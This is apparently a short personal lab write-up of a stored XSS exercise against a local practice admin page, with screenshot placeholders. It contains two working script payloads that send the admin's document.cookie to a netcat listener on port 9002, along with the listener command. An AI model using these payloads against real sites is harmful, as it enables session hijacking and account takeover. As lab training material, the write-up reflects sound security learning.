- Goto `localhost/labs/x0x03_admin.php` where `admin` can see all the support tickets
	- ![[Pasted image 20250406101654.png]]
- Steal the admin cookie
	- ![[Pasted image 20250406101714.png]]
- Set 2 containers as:
	- ![[Pasted image 20250406101826.png]]

# Exploitation
---
- Payload is:
```html
<script>window.location="http://localhost:9002/?cookie=" + document.cookie</script>
```
	OR
```html
<script> var i = new Image;i.src="http://localhost:9002"+document.cookie;</script>
```

- Setup a `nc` listener on port `9002`
	- `nc -lnvp 9002`

- On Hacker container:
	- `<script>window.location="http://localhost:9002/?cookie=" + document.cookie</script>`
	- ![[Pasted image 20250406103110.png]]
- On Admin container `refresh`
- On terminal:
	- ![[Pasted image 20250406103026.png]]